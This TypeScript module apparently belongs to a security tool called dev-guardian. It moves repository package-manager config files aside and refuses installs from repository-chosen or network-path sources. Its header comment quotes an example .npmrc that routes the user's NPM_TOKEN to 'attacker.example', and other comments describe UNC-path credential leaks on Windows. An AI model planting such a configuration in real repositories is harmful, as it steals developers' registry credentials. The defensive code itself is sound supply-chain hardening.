/**
 * A repository's package-manager configuration decides where a package
 * manager fetches from — and where it sends the user's credentials. A
 * repository `.npmrc` holding
 *
 *     registry=https://attacker.example/
 *     //attacker.example/:_authToken=${NPM_TOKEN}
 *
 * makes every `npm ci`, `npm install`, `npm outdated` and `npm audit` in the
 * checkout fetch from that host with the user's own `NPM_TOKEN` —
 * `--ignore-scripts` does not stop it: it is the fetch. A scoped registry
 * (`@scope:registry=…`) is the same route, and so are Yarn's, pip's, Cargo's,
 * Bundler's and NuGet's own project-level files.
 *
 * `create_fix_pr` works in its own disposable checkouts, so in each one —
 * the fix's worktree, the base-commit tree and the planning tree — every such
 * file is moved out of the tree before any package manager runs, and the
 * user's own configuration then applies:
 *
 *   - `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`, `pip.conf`, `pip.ini`,
 *     `.pip/`, `.cargo/config.toml` and `.cargo/config`, `.bundle/config` and
 *     `NuGet.config` (any case), in the project's directory and every
 *     directory above it up to the checkout's root (npm, Cargo and NuGet
 *     read them from there too).
 *
 * The fix's worktree gets them back before anything is committed
 * ({@link SetAside.restore}): the pull request is the fix and nothing else.
 *
 * `composer.json` cannot be moved aside — it IS the manifest the fix edits —
 * so a `repositories` entry in it refuses Composer's part instead
 * ({@link composerChoosesRepository}).
 */

import { mkdtempSync, renameSync, rmSync } from 'node:fs';
import { dirname, join, relative, resolve, sep } from 'node:path';
import { isWithinDir, listProjectDir, PROJECT_LOCKFILE_MAX_BYTES, readProjectJson } from '../platform/projectFs.js';
import { checkRequirements, describePipRefusal, urlHost, type PipRefusal } from '../deps/pipRequirements.js';
import { checkPyproject, checkSetupCfg } from '../deps/pythonProject.js';

/** Names moved aside in each directory, lower-cased (the match is case-insensitive). */
const TOP_LEVEL = new Set(['.npmrc', '.pnpmrc', '.yarnrc', '.yarnrc.yml', 'pip.conf', 'pip.ini', '.pip', 'nuget.config']);
/** `<dir>/<name>` → the files in it that are moved aside. */
const NESTED: Record<string, ReadonlySet<string>> = {
  '.cargo': new Set(['config.toml', 'config']),
  '.bundle': new Set(['config']),
};

export interface SetAside {
  /** What was moved, relative to the checkout's root, POSIX separators. */
  moved: string[];
  /** Puts every moved file back where it was. Idempotent. */
  restore(): void;
  /** Deletes what is still set aside (a disposable tree's), and the holding directory. */
  dispose(): void;
}

/** The directories from `projectDir` up to and including `root`. */
function dirsUpToRoot(root: string, projectDir: string): string[] {
  const out: string[] = [];
  const top = resolve(root);
  for (let dir = resolve(projectDir); isWithinDir(top, dir); dir = dirname(dir)) {
    out.push(dir);
    if (dir === top || dirname(dir) === dir) break;
  }
  return out;
}

/** Every package-manager configuration path in scope, absolute. */
export function repoPackageConfigPaths(root: string, projectDir: string): string[] {
  const out: string[] = [];
  for (const dir of dirsUpToRoot(root, projectDir)) {
    for (const entry of listProjectDir(root, dir)) {
      const lower = entry.name.toLowerCase();
      if (TOP_LEVEL.has(lower)) out.push(join(dir, entry.name));
      const nested = NESTED[lower];
      if (nested !== undefined && entry.kind === 'directory') {
        for (const inner of listProjectDir(root, join(dir, entry.name))) {
          if (nested.has(inner.name.toLowerCase())) out.push(join(dir, entry.name, inner.name));
        }
      }
    }
  }
  return out;
}

/**
 * Moves every repository package-manager configuration in scope out of the
 * checkout at `root` (see the module doc). A link is moved as a link, never
 * followed. Throws only when a move fails — the caller must not run a
 * package manager in a tree it could not clean.
 */
export function setAsidePackageConfig(root: string, projectDir: string): SetAside {
  const paths = repoPackageConfigPaths(root, projectDir);
  // Beside the checkout, not in it (a re-scan must not see the files) and not
  // on another volume (a rename moves a link as a link, and a directory whole).
  const holding = paths.length > 0 ? mkdtempSync(join(dirname(resolve(root)), '.guardian-fixpr-config-')) : null;
  const moves: Array<{ from: string; to: string }> = [];
  try {
    paths.forEach((from, i) => {
      if (holding === null) return;
      const to = join(holding, String(i));
      renameSync(from, to);
      moves.push({ from, to });
    });
  } catch (e) {
    for (const m of moves.reverse()) renameSync(m.to, m.from);
    if (holding !== null) rmSync(holding, { recursive: true, force: true });
    throw e;
  }
  let restored = false;
  return {
    moved: moves.map((m) => relative(resolve(root), m.from).split(sep).join('/')),
    restore: () => {
      if (restored) return;
      restored = true;
      for (const m of [...moves].reverse()) renameSync(m.to, m.from);
    },
    dispose: () => {
      if (holding !== null) rmSync(holding, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
    },
  };
}

/**
 * Why Composer must not run in this checkout — `composer.json` declares its
 * own `repositories` (a package source the repository chose, which the fix
 * cannot remove without also editing the manifest it commits) — or null.
 */
export function composerChoosesRepository(projectDir: string): string | null {
  const manifest = readProjectJson(projectDir, 'composer.json');
  if (typeof manifest !== 'object' || manifest === null) return null;
  const repos = (manifest as Record<string, unknown>)['repositories'];
  const declared = Array.isArray(repos) ? repos.length > 0 : typeof repos === 'object' && repos !== null && Object.keys(repos).length > 0;
  return declared
    ? "the project's composer.json declares its own package repositories; dev-guardian doesn't install from a repository-chosen source"
    : null;
}

// ------------------------------------------------------------------ pip

/** The requirement files the re-scan's pip-audit reads, as `deps_audit` finds them. */
export function rootRequirementFiles(projectDir: string): string[] {
  const out: string[] = [];
  for (const { name, kind } of listProjectDir(projectDir, projectDir)) {
    if (kind !== 'directory' && /^requirements.*\.txt$/i.test(name)) out.push(name);
  }
  for (const { name, kind } of listProjectDir(projectDir, join(projectDir, 'requirements'))) {
    if (kind !== 'directory' && name.toLowerCase().endsWith('.txt')) out.push(`requirements/${name}`);
  }
  return out;
}

/**
 * Every reason a pip install from this project must not happen
 * (`pipRequirements.ts`, `pythonProject.ts`): the requirements files
 * `deps_audit` hands pip-audit and `extra` (a fix's own file), with every
 * file they include; `pyproject.toml` and `setup.cfg`. Read within
 * `checkoutRoot`. Empty: installable.
 */
export function pythonInstallRefusals(projectDir: string, checkoutRoot: string, extra: readonly string[] = []): PipRefusal[] {
  const handed = rootRequirementFiles(projectDir);
  const requirements = checkRequirements(projectDir, [...handed, ...extra], checkoutRoot).refusals;
  return [
    ...requirements,
    ...checkPyproject(projectDir, checkoutRoot, handed.length === 0),
    ...checkSetupCfg(projectDir, checkoutRoot),
  ];
}

/** The refusal reason for a pip install, naming the first few refusals. */
export function pipInstallRefusal(refusals: readonly PipRefusal[]): string {
  const shown = refusals.slice(0, 3).map(describePipRefusal).join('; ');
  const more = refusals.length > 3 ? `; and ${refusals.length - 3} more` : '';
  return (
    `the project's Python requirements name where pip installs from, or could not be checked (${shown}${more}); ` +
    "dev-guardian installs only plain requirements it has read — a name, extras, versions and markers"
  );
}

// ------------------------------------------------------------------ npm

/** The package.json fields whose values are dependency specs. */
const NPM_SPEC_FIELDS = ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies', 'overrides', 'resolutions'] as const;

/**
 * Whether an npm dependency spec reaches a NETWORK path: `file:`, `link:`,
 * `portal:` or `git+file:` (or no prefix) followed by `\\host\share`,
 * `//host/share`, or `file://<host>/…` with a host other than `localhost`.
 * On Windows npm opens it — and Windows sends the user's credentials to the
 * host that answers.
 */
export function npmSpecNetworkHost(spec: string): string | null {
  const m = /^(?:(?:file|link|portal|git\+file):)?(.*)$/i.exec(spec.trim());
  const rest = m?.[1] ?? spec;
  if (/^(?:\\\\|\/\/)[^\\/]/.test(rest)) {
    // `file://host/…` after the prefix is stripped reads `//host/…`; `file:///…` reads `///…` (local).
    const host = /^(?:\\\\|\/\/)([^\\/]+)/.exec(rest)?.[1] ?? '';
    if (/^file:\/\//i.test(spec.trim()) && host.toLowerCase() === 'localhost') return null;
    return urlHost(rest);
  }
  if (/^\/{3,}[^/]/.test(rest) && /^(?:file|git\+file):/i.test(spec.trim())) {
    // `file:////host/share` — four slashes is a UNC path to Windows.
    const unc = rest.replace(/^\/+/, '//');
    return /^\/{4,}/.test(rest) ? urlHost(unc) : null;
  }
  return null;
}

/**
 * Dependency specs in `package.json` (and lock-file `resolved` entries) that
 * reach a network path, as `<file>: <field>.<name> (\\host)` — or empty.
 */
export function npmNetworkPaths(projectDir: string, checkoutRoot: string = projectDir): string[] {
  const out: string[] = [];
  const walk = (file: string, where: string, v: unknown, depth: number): void => {
    if (depth > 6 || out.length >= 10) return;
    if (typeof v === 'string') {
      const host = npmSpecNetworkHost(v);
      if (host !== null) out.push(`${file}: ${where} (${host})`);
      return;
    }
    if (typeof v === 'object' && v !== null && !Array.isArray(v)) {
      for (const [k, inner] of Object.entries(v)) walk(file, where === '' ? k : `${where}.${k}`, inner, depth + 1);
    }
  };
  const pkg = readProjectJson(checkoutRoot, join(projectDir, 'package.json'));
  if (typeof pkg === 'object' && pkg !== null) {
    for (const field of NPM_SPEC_FIELDS) walk('package.json', field, (pkg as Record<string, unknown>)[field], 0);
  }
  const lock = readProjectJson(checkoutRoot, join(projectDir, 'package-lock.json'), PROJECT_LOCKFILE_MAX_BYTES);
  const packages = typeof lock === 'object' && lock !== null ? (lock as Record<string, unknown>)['packages'] : undefined;
  if (typeof packages === 'object' && packages !== null) {
    for (const [key, entry] of Object.entries(packages)) {
      if (out.length >= 10) break;
      const resolved = typeof entry === 'object' && entry !== null ? (entry as Record<string, unknown>)['resolved'] : undefined;
      if (typeof resolved === 'string') walk('package-lock.json', `packages.${key || '(root)'}.resolved`, resolved, 0);
    }
  }
  return out;
}

/** The refusal reason for an npm install that would reach a network path. */
export function npmNetworkRefusal(where: readonly string[]): string {
  const shown = where.slice(0, 3).join('; ');
  const more = where.length > 3 ? `; and ${where.length - 3} more` : '';
  return `the project's npm dependencies point at a network path (${shown}${more}); dev-guardian doesn't install from a network path`;
}

/**
 * Why a group must not be attempted in this checkout, or null:
 *
 *   - a Composer step where `composer.json` declares its own repositories
 *     ({@link composerChoosesRepository});
 *   - a pip step, or a re-scan by `deps_audit` (whose pip-audit installs
 *     every requirement into a temporary virtualenv — building any sdist it
 *     fetches), where the project's Python requirements are not all plain
 *     requirements this server has read ({@link pythonInstallRefusals});
 *   - an npm install — a step, or the test environment's `npm ci` — where a
 *     dependency points at a network path ({@link npmNetworkPaths}).
 *
 * `checkoutRoot`: the whole checkout `projectDir` sits in, which every file
 * is read within.
 */
export function installRefusal(opts: {
  projectDir: string;
  checkoutRoot?: string;
  stepEcosystems: readonly string[];
  stepFiles: readonly string[];
  rescanTools: readonly string[];
  /** An npm install runs in this checkout: the test environment's `npm ci`, or an npm step. */
  npmInstalls?: boolean;
}): string | null {
  const root = opts.checkoutRoot ?? opts.projectDir;
  if (opts.stepEcosystems.includes('composer')) {
    const composer = composerChoosesRepository(opts.projectDir);
    if (composer !== null) return composer;
  }
  if (opts.stepEcosystems.includes('pip') || opts.rescanTools.includes('deps_audit')) {
    const refusals = pythonInstallRefusals(
      opts.projectDir,
      root,
      opts.stepFiles.filter((f) => /\.(txt|in)$/i.test(f)),
    );
    if (refusals.length > 0) return pipInstallRefusal(refusals);
  }
  if (opts.npmInstalls === true || opts.stepEcosystems.includes('npm')) {
    const network = npmNetworkPaths(opts.projectDir, root);
    if (network.length > 0) return npmNetworkRefusal(network);
  }
  return null;
}
